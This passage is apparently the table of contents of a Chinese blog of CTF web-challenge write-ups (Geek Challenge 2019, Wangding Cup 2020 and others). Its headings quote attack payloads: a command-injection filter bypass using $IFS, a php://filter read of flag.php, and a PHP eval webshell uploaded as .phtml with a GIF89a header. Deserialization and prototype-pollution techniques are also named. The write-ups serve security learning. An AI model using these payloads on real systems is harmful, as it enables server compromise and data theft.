class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B9%8B%E5%90%8E%E5%88%A4%E6%96%AD%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%BA%94%E8%AF%A5%E5%8F%AF%E4%BB%A5%E7%94%A8%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E7%9B%B4%E6%8E%A5-a-fl-b-ag-cat-IFS-1-a-b-php%E4%BE%9D%E7%84%B6%E6%98%BE%E7%A4%BAflag%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E6%97%A0%E6%B3%95%E7%90%86%E8%A7%A3%EF%BC%8C%E4%BA%8E%E6%98%AF%E5%85%88%E5%8E%BB%E6%AC%BA%E8%B4%9F%E6%AC%BA%E8%B4%9F%E8%BD%AF%E6%9F%BF%E5%AD%90index-php-%E7%9B%B4%E6%8E%A5cat-IFS-1index-php%E6%8B%BF%E4%B8%8B"><span class="toc-number">6.4.</span> <span class="toc-text">尝试之后判断第一种应该可以用的，但是直接;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php依然显示flag被过滤，无法理解，于是先去欺负欺负软柿子index.php,直接cat$IFS$1index.php拿下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%8B%E4%BA%86%E6%BA%90%E4%BB%A3%E7%A0%81%E6%89%8D%E7%9F%A5%E9%81%93%E8%BF%87%E6%BB%A4flag%E7%9A%84%E6%96%B9%E5%BC%8F%E6%98%AF%E6%8C%89%E9%A1%BA%E5%BA%8F%E5%88%A4%E6%96%AD%E6%9C%89%E6%B2%A1%E6%9C%89flag%EF%BC%8C%E4%B8%AD%E9%97%B4%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%AD%97%E7%AC%A6%E9%9A%94%E5%BC%80%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E9%98%B2%E6%AD%A2fla-g%E7%AD%89%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%AA%E8%A6%81%E6%8A%8Aflag%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%89%93%E4%B9%B1%E5%86%8D%E8%B5%8B%E5%80%BC%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%A2%AB%E6%A3%80%E6%B5%8B%E5%88%B0%E4%BA%86%EF%BC%8C%E6%9E%84%E9%80%A0payload"><span class="toc-number">6.5.</span> <span class="toc-text">看了源代码才知道过滤flag的方式是按顺序判断有没有flag，中间可以用字符隔开，这样就防止fla\g等绕过方法，只要把flag的顺序打乱再赋值就不会被检测到了，构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E5%9C%A8%E6%BA%90%E7%A0%81%E9%87%8C"><span class="toc-number">6.6.</span> <span class="toc-text">flag在源码里</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">7.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%BB%8E%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9C%8B%E8%A7%81%E2%80%9COh-You-found-me%E2%80%9D%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%89%8D%E9%9D%A2%E6%9C%89%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%B7%B3%E8%BD%AC%E7%9A%84%E9%93%BE%E6%8E%A5%EF%BC%8C%E7%82%B9%E8%BF%9B%E5%8E%BB%EF%BC%8C%E8%BF%9B%E5%85%A5%E4%B8%8B%E4%B8%80%E5%85%B3%E3%80%82"><span class="toc-number">7.1.</span> <span class="toc-text">首先从网页源代码中看见“Oh! You found me”，并且前面有一个可以跳转的链接，点进去，进入下一关。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BD%91%E9%A1%B5%E4%B8%AD%E9%97%B4%E6%9C%89%E4%B8%80%E4%B8%AAsecret%E6%8C%89%E9%92%AE%EF%BC%8C%E6%8C%89%E4%BA%86%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E2%80%9C%E6%B2%A1%E7%9C%8B%E6%B8%85%E4%B9%88%EF%BC%9F%E5%9B%9E%E5%8E%BB%E5%86%8D%E4%BB%94%E7%BB%86%E7%9C%8B%E7%9C%8B%E5%90%A7%E3%80%82%E2%80%9D%EF%BC%8C%E5%88%A4%E6%96%AD%E4%B8%BA%E9%87%8D%E5%AE%9A%E5%90%91%E7%B1%BB%E5%9E%8B%EF%BC%8C%E5%8E%BBBP%E6%8A%93%E5%8C%85%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AF302%E9%87%8D%E5%AE%9A%E5%90%91%E5%9E%8B%E7%BD%91%E9%A1%B5%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%80%E4%B8%AA%E2%80%9Csecr3t-php%E2%80%9D%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%BF%9B%E5%85%A5%E4%B8%8B%E4%B8%80%E5%85%B3%E3%80%82"><span class="toc-number">7.2.</span> <span class="toc-text">跳转之后的网页中间有一个secret按钮，按了之后显示“没看清么？回去再仔细看看吧。”，判断为重定向类型，去BP抓包，果然是302重定向型网页，里面有一个“secr3t.php”，访问进入下一关。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E4%B8%80%E5%85%B3%E7%9B%B4%E6%8E%A5%E7%BB%99%E4%BA%86%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E6%9C%89include%E5%87%BD%E6%95%B0%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%AF%B4%E4%BA%86flag%E5%9C%A8flag-php%E4%B8%AD%EF%BC%8C%E6%89%80%E4%BB%A5%E5%88%A4%E6%96%AD%E4%B8%BA%E7%94%A8-filter%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E6%9E%84%E9%80%A0-file-php-filter-read-convert-base64-encode-resource-flag-php-%E8%BF%99%E9%87%8Cbase%E7%BC%96%E7%A0%81%E6%98%AF%E4%B8%BA%E4%BA%86%E6%8A%8A%E6%B3%A8%E9%87%8A%E4%B9%9F%E8%AF%BB%E5%8F%96%E5%87%BA%E6%9D%A5%EF%BC%8C%E4%B8%8D%E7%84%B6%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9C%8B%E4%B8%8D%E5%88%B0%E6%B3%A8%E9%87%8A-%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%87%BA%E6%9D%A5%E8%A7%A3%E7%A0%81%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">7.3.</span> <span class="toc-text">下一关直接给了源代码，源代码里面有include函数，并且说了flag在flag.php中，所以判断为用:&#x2F;&#x2F;filter读取源代码，构造?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php(这里base编码是为了把注释也读取出来，不然直接读取源代码看不到注释)，读取出来解码即可。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">8.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E9%81%93%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%EF%BC%8C%E5%85%88%E4%B8%8A%E4%BC%A0%E4%B8%AA-php%E6%96%87%E4%BB%B6%E7%9C%8B%E7%9C%8B%E6%83%85%E5%86%B5%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%9B%9E%E6%98%BEnot-image%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E6%98%AFMIME%E7%BB%95%E8%BF%87%EF%BC%8C%E6%89%80%E4%BB%A5BP%E6%8A%93%E5%8C%85%E5%90%8E%E6%94%B9content-type%E4%B8%BAimage-png%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%9B%9E%E6%98%BE%E5%8F%98%E4%B8%BA%E2%80%9Cnot%EF%BC%81php%EF%BC%81%E2%80%9D%EF%BC%8C%E6%98%BE%E7%84%B6%E6%98%AF%E8%BF%87%E6%BB%A4%E4%BA%86php%E7%9A%84%E5%90%8E%E7%BC%80%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%95%E8%AF%95%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%E6%88%96%E8%80%85%E7%94%A8-phtml%E8%AF%95%E8%AF%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%89%8D%E8%80%85%E4%B9%9F%E4%B8%8D%E8%A1%8C%EF%BC%8C%E4%BD%86-phtml%E5%9B%9E%E6%98%BE%E5%8F%91%E7%94%9F%E5%8F%98%E5%8C%96%EF%BC%8C%E5%8F%98%E4%B8%BA%E4%B8%8D%E8%83%BD%E6%9C%89%E2%80%9C%E3%80%8Ascript-language-%E2%80%99php%E2%80%99%E3%80%8B-eval-POST-%E2%80%98a%E2%80%99-%E3%80%8A-script%E3%80%8B"><span class="toc-number">8.1.</span> <span class="toc-text">这是一道文件上传题，先上传个.php文件看看情况，发现回显not image，判断可能是MIME绕过，所以BP抓包后改content-type为image&#x2F;png即可，回显变为“not！php！”，显然是过滤了php的后缀，可以试试大小写绕过或者用.phtml试试，发现前者也不行，但.phtml回显发生变化，变为不能有“《script language&#x3D;’php’》@eval($_POST[‘a’]);《&#x2F;script》</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%90%8E%E5%9B%9E%E6%98%BE%E5%8F%91%E7%94%9F%E5%8F%98%E5%8C%96%EF%BC%8C%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%98%AFimage%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E6%98%AF%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%EF%BC%8C%E9%9C%80%E8%A6%81%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%B9%8B%E5%89%8D%E6%96%B0%E7%94%9F%E8%B5%9B%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%96%B9%E6%B3%95%E7%9B%B4%E6%8E%A5%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%A4%B4%E6%AF%94%E5%A6%82gif%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4GIF89a%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BB%85%E4%BB%85%E5%91%8A%E8%AF%89%E4%BA%86%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D%E8%80%8C%E6%B2%A1%E6%9C%89%E5%91%8A%E8%AF%89%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%98%AF%E9%BB%98%E8%AE%A4%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84-upload-xxx-phtml%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E5%A4%B4%E8%BF%98%E5%9C%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BB%A3%E7%A0%81%E6%B6%88%E5%A4%B1%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%8C%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">8.2.</span> <span class="toc-text">上传后回显发生变化，显示不完全是image，判断可能是文件头检测，需要上传图片马，可以用之前新生赛的一道题一样的方法直接制作图片马，也可以直接加文件头比如gif的文件头GIF89a，上传成功，但是仅仅告诉了我们上传文件名而没有告诉路径，猜测可能是默认上传路径&#x2F;upload&#x2F;xxx.phtml，访问后发现文件头还在，但是代码消失，说明代码被执行，蚁剑连接即可。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E7%9C%8B%E5%88%B0%E9%A1%B5%E9%9D%A2%E4%B8%8A%E5%A4%87%E4%BB%BD%E7%BD%91%E7%AB%99%E7%9A%84%E5%AD%97%E6%A0%B7%EF%BC%8C%E6%83%B3%E5%88%B0%E5%8F%AF%E8%83%BD%E6%9C%89%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8dirsearch%E6%89%AB%E6%8F%8F%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%BE%97%E5%88%B0www-zip%E8%BF%99%E4%B8%AA%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8Cdirsearch%E5%91%BD%E4%BB%A4%E4%B8%BA"><span class="toc-number">9.1.</span> <span class="toc-text">首先看到页面上备份网站的字样，想到可能有备份文件，所以用dirsearch扫描一下，得到www.zip这个备份文件，dirsearch命令为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E4%B8%8B%E8%BD%BD%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BE%97%E5%88%B0flag-php-class-php-index-php%E4%B8%89%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8Cflag-php%E9%87%8C%E9%9D%A2%E6%98%AF%E5%81%87flag%EF%BC%8Cclass-php%E9%87%8C%E9%9D%A2%E6%98%AF%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%8C%85%E5%90%AB%E4%BA%86flag-php%EF%BC%8C%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%9A%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%EF%BC%8C%E5%86%8D%E7%9C%8Bindex-php%E6%96%87%E4%BB%B6%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8C%85%E5%90%AB%E4%BA%86class-php%EF%BC%8C%E8%BF%98%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0unserialize-%E5%88%A4%E6%96%AD%E4%B8%BAphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%A2%98"><span class="toc-number">9.2.</span> <span class="toc-text">然后下载备份文件，得到flag.php,class.php,index.php三个文件，flag.php里面是假flag，class.php里面是一个类的定义，并且包含了flag.php，还有很多魔术方法，再看index.php文件，里面包含了class.php，还有反序列化函数unserialize.判断为php反序列化类型的题.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">9.3.</span> <span class="toc-text">首先了解一下魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87%E8%BF%99%E4%BA%9B%E8%87%AA%E5%8A%A8%E8%B0%83%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%9D%A5%E6%8E%A7%E5%88%B6%E8%BF%99%E4%BA%9B%E5%87%BD%E6%95%B0%E9%87%8C%E9%9D%A2%E5%8D%B1%E9%99%A9%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">9.4.</span> <span class="toc-text">反序列化漏洞就是通过这些自动调用的魔术方法来控制这些函数里面危险的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E8%AE%A9%E6%88%91%E4%BB%AC%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8Cindex-php%E4%B8%ADget%E4%BA%86%E4%B8%80%E4%B8%AA%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E7%9A%84%E5%8F%98%E9%87%8Fselect%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E6%88%91%E4%BB%AC%E6%8A%8Aselect%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%8F%90%E5%89%8D%E7%B3%BB%E5%88%97%E5%8C%96%E7%9A%84pop%E9%93%BE%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E4%B8%ADName%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%AC%A6%E5%90%88class-php%E4%B8%AD-destruct%E7%9A%84%E8%A6%81%E6%B1%82%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E8%83%BD%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">9.5.</span> <span class="toc-text">然后让我们进行代码审计，index.php中get了一个我们可以控制的变量select，并将其进行反序列化，所以如果我们把select设置为提前系列化的pop链，并将其中Name类的对象参数设置的符合class.php中__destruct的要求，我们就能得到flag。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%8D%B3%E5%8F%AF%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0flag"><span class="toc-number">9.6.</span> <span class="toc-text">利用这个脚本即可爆破得到flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">10.</span> <span class="toc-text">反序列化+原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-number">11.</span> <span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%81%E7%AC%AC20%E6%9D%A1"><span class="toc-number">11.0.1.</span> <span class="toc-text">见第20条^-^</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unserialize3"><span class="toc-number">12.</span> <span class="toc-text">unserialize3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E7%AE%80%E5%8D%95%E7%9A%84wakeup%E7%BB%95%E8%BF%87%EF%BC%8C%E5%88%A9%E7%94%A8%E5%BD%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E8%A1%A8%E7%A4%BA%E5%B1%9E%E6%80%A7%E4%B8%AA%E6%95%B0%E7%9A%84%E5%80%BC%E2%BC%A4%E4%BA%8E%E7%9C%9F%E5%AE%9E%E5%B1%9E%E6%80%A7%E4%B8%AA%E6%95%B0%E6%97%B6%EF%BC%8C%E4%BC%9A%E7%BB%95%E8%BF%87-wakeup-%E5%87%BD%E6%95%B0%E7%9A%84%E6%89%A7%E2%BE%8F%E3%80%82"><span class="toc-number">12.0.1.</span> <span class="toc-text">一个非常简单的wakeup绕过，利用当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E5%85%A5%E5%8F%82%E6%95%B0%E5%90%8E%E6%8B%BF%E5%88%B0flag"><span class="toc-number">12.0.2.</span> <span class="toc-text">传入参数后拿到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wife-wife"><span class="toc-number">13.</span> <span class="toc-text">wife_wife</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E5%90%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8B%E9%9D%A2%E6%9C%89%E4%B8%AA%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%85%88%E5%8E%BB%E6%B3%A8%E5%86%8C%E7%9C%8B%E7%9C%8B%EF%BC%8C%E6%B3%A8%E5%86%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%AAis-Admin%E7%9A%84%E9%80%89%E9%A1%B9%EF%BC%8C%E9%80%89%E4%B8%8A%E4%B9%8B%E5%90%8E%E8%AE%A9%E4%BD%A0%E5%A1%AB%E9%82%80%E8%AF%B7%E7%A0%81%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E7%B1%BB%E4%BC%BC%E4%BA%8E%E5%86%85%E9%83%A8%E4%BA%BA%E5%91%98%E7%9A%84%E9%80%89%E9%A1%B9%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%8F%AF%E8%83%BD%E8%A6%81%E8%B6%8A%E6%9D%83%E6%B3%A8%E5%86%8C%E5%88%B0%E5%86%85%E9%83%A8%E4%BA%BA%E5%91%98%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%97%A2%E7%84%B6%E8%83%BD%E6%B3%A8%E5%86%8C%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7%EF%BC%8C%E4%B8%8D%E5%A6%A8%E5%85%88%E6%B3%A8%E5%86%8C%E8%AF%95%E8%AF%95%E3%80%82"><span class="toc-number">13.0.1.</span> <span class="toc-text">打开后是一个登录界面，然后下面有个注册，先去注册看看，注册里面有个is Admin的选项，选上之后让你填邀请码，应该是类似于内部人员的选项，猜测可能要越权注册到内部人员，不过既然能注册普通账户，不妨先注册试试。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E6%B3%A8%E5%86%8C%E5%90%8E%E7%99%BB%E5%BD%95%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%AAflag%EF%BC%8C%E5%85%88%E8%AF%95%E8%AF%95%E6%8F%90%E4%BA%A4%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AF%E5%81%87%E7%9A%84%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%9C%89%E4%B8%AA%E4%B8%8B%E8%BD%BD%E6%8C%89%E9%92%AE%EF%BC%8C%E6%84%9F%E8%A7%89%E8%AF%B4%E4%B8%8D%E5%AE%9A%E6%9C%89%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BAwife%E7%9A%84%E5%85%83%E7%B4%A0%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%85%83%E7%B4%A0%E5%9C%A8%E5%89%8D%E7%AB%AF%E6%BA%90%E4%BB%A3%E7%A0%81%E9%87%8C%E9%9D%A2%E8%83%BD%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E5%85%88%E6%8A%8A%E5%88%9A%E6%89%8D%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%A4%E4%B8%AA%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81register-html%E5%92%8Clogin-html%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%85%88%E7%9C%8B%E7%9C%8B%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%A5%BD%E5%83%8F%E6%98%AF%E7%B1%BB%E4%BC%BC%E4%BA%8E%E6%A8%A1%E7%89%88%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%8C%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E4%BD%9C%E7%94%A8%EF%BC%8C%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E3%80%82"><span class="toc-number">13.0.2.</span> <span class="toc-text">然后注册后登录，发现有个flag，先试试提交，果然是假的，下面有个下载按钮，感觉说不定有文件下载漏洞，查看网页源代码后发现下载的是一个名为wife的元素，这个元素在前端源代码里面能修改，所以就先把刚才遇见的两个网页源代码register.html和login.html下载下来先看看，发现好像是类似于模版的东西，没有什么作用，果然还是黑盒环境。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A2%E7%84%B6%E7%99%BB%E5%BD%95%E5%90%8E%E6%9A%82%E6%97%B6%E6%B2%A1%E5%95%A5%E5%8F%AF%E4%BB%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E4%BA%86%EF%BC%8C%E5%B0%B1%E5%8E%BB%E4%B9%8B%E5%89%8D%E5%8F%91%E7%8E%B0%E7%9A%84%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B3%A8%E5%86%8C%E7%BD%91%E9%A1%B5is-Admin%E9%80%89%E9%A1%B9%E8%AF%95%E8%AF%95%E5%90%A7%EF%BC%8C%E5%85%88%E8%AF%95%E8%AF%95%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B0%B8%E7%9C%9F%E7%BB%95%E8%BF%87%E9%82%80%E8%AF%B7%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%8D%E8%A1%8C%EF%BC%88%E8%BF%99%E4%B8%AA%E6%B3%A8%E5%86%8C%E7%8E%AF%E5%A2%83%E7%94%9A%E8%87%B3%E6%B2%A1%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%AA%E9%A2%98%E5%AD%A6%E5%A7%90%E7%BB%99%E6%88%91%E4%BB%AC%E9%A2%98%E5%9E%8B%E4%BA%86%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%96%E8%80%85%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%82%AF%E5%AE%9A%E4%B8%8D%E5%A4%AA%E5%8F%AF%E8%83%BD%EF%BC%8C%E8%BF%99%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%89%E7%82%B9%E6%8A%BD%E8%B1%A1%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E7%8C%9C%E6%B5%8B%E6%98%AF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E5%8F%88%E6%98%AF%E5%AE%8C%E5%85%A8%E9%99%8C%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%90%8D%E8%AF%8D%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E5%8E%BB%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%90%A7"><span class="toc-number">13.0.3.</span> <span class="toc-text">既然登录后暂时没啥可以操作的了，就去之前发现的可能存在漏洞的注册网页is 